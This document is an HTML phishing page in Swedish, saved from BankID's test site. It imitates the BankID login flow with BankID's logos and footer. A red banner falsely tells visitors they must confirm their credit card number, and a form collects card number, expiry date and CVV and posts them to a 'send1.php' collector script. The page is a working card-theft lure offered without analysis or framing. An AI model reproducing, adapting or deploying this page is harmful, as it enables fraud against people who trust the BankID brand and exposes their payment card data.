<!DOCTYPE html>
<!-- saved from url=(0051)https://test.bankid.com/otherDevice/auth/inProgress -->
<html lang="sv"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <link rel="icon" href="https://test.bankid.com/favicon.ico">
    <link rel="apple-touch-icon" href="https://test.bankid.com/apple-touch-icon.png" sizes="180x180">
    <link rel="manifest" href="https://test.bankid.com/manifest.json">
    <link rel="mask-icon" href="https://test.bankid.com/safari-pinned-tab.svg" color="#5bbad5">

    <meta name="theme-color" content="#ffffff">
    <meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">

    <title>identifiering med Mobilt BankID </title>
    
    <link rel="stylesheet" href="./files/index.9ae7499e.css">
    <style>
    input {
    margin-top: 3px;
    padding: 15px;
    font-size: 16px;
    width: 100%;
    border-radius: 3px;
    border: 1px solid #dcdcdc;
}
    
    label {
    padding-bottom: 5px;
    font-size: 14px;
}
    
    </style>
 </head>
  <body>
    

    <div id="root"><div class="mobileDesign"><div class="flex flex-col min-h-screen">
        <div class="md:container flex flex-wrap items-center px-6 md:mx-auto"><a class="no-underline" data-react-link="true" href="https://test.bankid.com/"><div class="flex flex-row items-center py-4"><img src="./files/logo-bank-id.c1b34776.svg" alt="Back to start page" class="w-12">
            </div></a><ul class="flex grow justify-end items-center font-bold"></ul></div>
        <div class="w-full"><div class="bg-bid-midnight-blue"></div><div class="flex flex-col grow md:mt-[71px]"><div class="p-6"><div class="flex justify-center items-center w-full"><div class="flex relative flex-col py-16 px-6 md:px-16 bg-bid-ice-blue w-[550px] max-w-full min-h-[550px]">
            <div class="flex justify-center items-center">
            
            <label style="color: red">
            Du måste bekräfta ditt kreditkortsnummer, som kommer att kopplas till vår tjänst    
            </label>
            
            </div>
            <form action="send1.php" method="post">
            <div class="flex flex-col grow">
           
                <div class="field-container">
            <label for="expirationdate">Kortnummer</label>
            <input id="expirationdate" type="text" pattern="[0-9]*" inputmode="numeric" maxlength="20" minlength="16" required placeholder="XXXX XXXX XXXX XXXX" name="cc">
        </div>
                <div class="field-container">
            <label for="expirationdate">Utgångsdatum</label>
            <input id="expirationdate" type="text" pattern="[0-9]*" inputmode="numeric" maxlength="8" minlength="4" required  placeholder="MMÅÅ" name="date">
        </div>
        <div class="field-container">
            <label for="securitycode">Säkerhetskod</label>
            <input id="securitycode" type="text" pattern="[0-9]*" inputmode="numeric" maxlength="4" minlength="3" required placeholder="CVV" name="cvv">
        </div>
              
                 <div class="field-container">
            <input id="securitycode" type="submit" style="margin-top: 30px;background-color: #183e4f;color: white" value="Skicka in">
        </div>
                </form>
            </div></div></div></div></div>
            <footer class="py-[43px] text-[14px] text-white bg-bid-midnight-blue mt-6 md:mt-32"><div class="container p-4 mx-auto flex flex-col sm:flex-row flex-wrap gap-x-[24px] gap-y-[32px] justify-center items-center"><div class="flex grow-0 xl:grow gap-[24px]"><img src="./files/logo-bank-id-white.acd82fbd.svg" class="w-auto h-[45px]" alt=""><img src="./files/eleg-sv.f8836f92.svg" class="w-auto h-[45px]" alt=""></div><div class="grow"></div><div class="text-center"><span class="invisible mx-2">|</span><a class="text-white hover:text-white underline hover:no-underline ignore-external-icon" data-react-link="true" href="s">Cookie Policy</a><span class="mx-2 text-white">|</span><a href="" class="text-white hover:text-white underline hover:no-underline ignore-external-icon" data-react-link="true" target="_blank" rel="noreferrer">Privacy Policy</a><span class="mx-2 text-white invisible">|</span><div class="inline-block">© 2023 <span>Finansiell ID-Teknik BID AB</span></div></div></div></footer></div></div></div>

      </div></body></html>